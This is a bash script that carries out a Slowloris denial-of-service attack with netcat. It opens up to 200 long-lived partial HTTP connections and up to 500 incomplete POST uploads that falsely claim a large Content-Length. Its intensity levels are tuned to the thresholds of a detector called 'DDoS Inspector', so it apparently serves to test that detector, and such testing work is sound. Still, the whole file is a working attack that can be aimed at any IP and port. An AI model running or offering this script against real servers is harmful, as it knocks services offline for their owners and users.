#!/bin/bash

# Enhanced Slowloris Attack Script
# Now generates attacks intense enough to trigger the harder detection thresholds

TARGET_IP=${1:-"127.0.0.1"}
TARGET_PORT=${2:-"80"}
DURATION=${3:-"300"}  # Increased default duration for slowloris (5 minutes)
INTENSITY=${4:-"high"}

echo "🐌 Starting Enhanced Slowloris Attack"
echo "Target: $TARGET_IP:$TARGET_PORT"
echo "Duration: ${DURATION}s"
echo "Intensity: $INTENSITY"

case $INTENSITY in
    "low")
        CONNECTIONS=30      # Should NOT trigger (need 50+ long sessions)
        INCOMPLETE_REQS=60  # Should NOT trigger (need 100+ incomplete)
        ;;
    "medium") 
        CONNECTIONS=60      # Should trigger if combined with incomplete requests
        INCOMPLETE_REQS=120 # Should trigger if combined with long sessions
        ;;
    "high")
        CONNECTIONS=100     # Should definitely trigger
        INCOMPLETE_REQS=200 # Should definitely trigger
        ;;
    "extreme")
        CONNECTIONS=200     # Overwhelm detection
        INCOMPLETE_REQS=500 # Overwhelm detection
        ;;
esac

echo "📊 Attack Parameters:"
echo "  - Long-lived connections: $CONNECTIONS"
echo "  - Incomplete requests: $INCOMPLETE_REQS"
echo "  - Session duration: ${DURATION}s"
echo ""

# Function to create long-lived HTTP connection
create_slowloris_connection() {
    local conn_id=$1
    local target_ip=$2
    local target_port=$3
    local duration=$4
    
    # Create a partial HTTP request that keeps connection open
    {
        echo -e "GET / HTTP/1.1\r"
        echo -e "Host: $target_ip\r"
        echo -e "User-Agent: Mozilla/5.0 (Slowloris-$conn_id)\r"
        echo -e "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r"
        echo -e "Accept-Language: en-us,en;q=0.5\r"
        echo -e "Accept-Encoding: gzip,deflate\r"
        echo -e "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r"
        echo -e "Cache-Control: no-cache\r"
        echo -e "X-Requested-With: XMLHttpRequest\r"
        
        # Keep sending incomplete headers periodically to maintain connection
        local end_time=$(($(date +%s) + duration))
        local header_count=0
        
        while [ $(date +%s) -lt $end_time ]; do
            echo -e "X-Custom-Header-$header_count: incomplete-request-$conn_id\r"
            header_count=$((header_count + 1))
            sleep 10  # Send a header every 10 seconds to keep alive
        done
        
        # Never send the final \r\n to complete the request
    } | timeout $duration nc $target_ip $target_port >/dev/null 2>&1 &
    
    echo $!  # Return PID for cleanup
}

# Function to create incomplete HTTP requests
create_incomplete_request() {
    local req_id=$1
    local target_ip=$2
    local target_port=$3
    
    # Send partial request and keep connection hanging
    {
        echo -e "POST /upload HTTP/1.1\r"
        echo -e "Host: $target_ip\r"
        echo -e "Content-Type: multipart/form-data; boundary=----incomplete$req_id\r"
        echo -e "Content-Length: 999999\r"  # Lie about content length
        echo -e "Connection: keep-alive\r"
        echo -e "\r"
        echo -e "------incomplete$req_id\r"
        echo -e "Content-Disposition: form-data; name=\"file\"; filename=\"test.txt\"\r"
        echo -e "\r"
        # Send only partial data, never complete the request
        echo -n "This is incomplete data for request $req_id..."
        
        # Keep connection open by never finishing
        sleep 600  # Hold for 10 minutes
    } | nc $target_ip $target_port >/dev/null 2>&1 &
    
    echo $!  # Return PID for cleanup
}

# Check dependencies
if ! command -v nc &> /dev/null; then
    echo "⚠️  netcat (nc) not found. Installing..."
    sudo apt-get update && sudo apt-get install -y netcat
fi

echo "🎯 Starting Slowloris attack..."
echo "⏱️  This will run for $DURATION seconds"

# Arrays to store process IDs for cleanup
declare -a CONNECTION_PIDS
declare -a REQUEST_PIDS

# Phase 1: Create long-lived connections
echo "📡 Creating $CONNECTIONS long-lived connections..."
for ((i=1; i<=CONNECTIONS; i++)); do
    pid=$(create_slowloris_connection $i $TARGET_IP $TARGET_PORT $DURATION)
    CONNECTION_PIDS[$i]=$pid
    
    # Progress indicator
    if [ $((i % 10)) -eq 0 ]; then
        echo "   Created $i/$CONNECTIONS connections..."
    fi
    
    # Small delay to avoid overwhelming the target immediately
    sleep 0.1
done

echo "✅ Created $CONNECTIONS long-lived connections"

# Phase 2: Create incomplete requests
echo "📝 Creating $INCOMPLETE_REQS incomplete requests..."
for ((i=1; i<=INCOMPLETE_REQS; i++)); do
    pid=$(create_incomplete_request $i $TARGET_IP $TARGET_PORT)
    REQUEST_PIDS[$i]=$pid
    
    # Progress indicator
    if [ $((i % 20)) -eq 0 ]; then
        echo "   Created $i/$INCOMPLETE_REQS incomplete requests..."
    fi
    
    # Small delay between requests
    sleep 0.05
done

echo "✅ Created $INCOMPLETE_REQS incomplete requests"

# Monitor attack progress
start_time=$(date +%s)
echo ""
echo "🔥 Slowloris attack is now active!"
echo "💡 Expected detection behavior:"
echo "   - Need 50+ long sessions AND 100+ incomplete requests"
echo "   - Current: $CONNECTIONS long sessions, $INCOMPLETE_REQS incomplete requests"

if [ $CONNECTIONS -ge 50 ] && [ $INCOMPLETE_REQS -ge 100 ]; then
    echo "   ✅ Should trigger detection (both thresholds met)"
elif [ $CONNECTIONS -ge 50 ]; then
    echo "   ⚠️  May not trigger (missing incomplete requests threshold)"
elif [ $INCOMPLETE_REQS -ge 100 ]; then
    echo "   ⚠️  May not trigger (missing long sessions threshold)"
else
    echo "   ❌ Should NOT trigger (neither threshold met)"
fi

# Wait for duration or user interrupt
trap 'echo "🛑 Received interrupt signal, cleaning up..."; break' INT TERM

while true; do
    current_time=$(date +%s)
    elapsed=$((current_time - start_time))
    
    if [ $elapsed -ge $DURATION ]; then
        break
    fi
    
    remaining=$((DURATION - elapsed))
    active_connections=$(ps aux | grep -c "nc $TARGET_IP $TARGET_PORT" || echo "0")
    echo "⏳ Attack active... ${remaining}s remaining (active connections: ~$active_connections)"
    sleep 10
done

# Cleanup
echo ""
echo "🧹 Cleaning up attack processes..."

# Kill connection processes
for pid in "${CONNECTION_PIDS[@]}"; do
    kill $pid 2>/dev/null || true
done

# Kill request processes  
for pid in "${REQUEST_PIDS[@]}"; do
    kill $pid 2>/dev/null || true
done

# Kill any remaining nc processes targeting our host
pkill -f "nc $TARGET_IP $TARGET_PORT" 2>/dev/null || true

# Final cleanup
sleep 2
remaining_procs=$(ps aux | grep -c "nc $TARGET_IP $TARGET_PORT" || echo "0")
if [ "$remaining_procs" -gt 1 ]; then  # grep itself counts as 1
    echo "⚠️  Force killing remaining processes..."
    pkill -9 -f "nc $TARGET_IP $TARGET_PORT" 2>/dev/null || true
fi

echo "✅ Slowloris attack completed"
echo "📊 Attack Summary:"
echo "   - Duration: ${elapsed}s"
echo "   - Long connections: $CONNECTIONS"
echo "   - Incomplete requests: $INCOMPLETE_REQS"
echo "🔍 Check your DDoS Inspector logs for detection alerts"

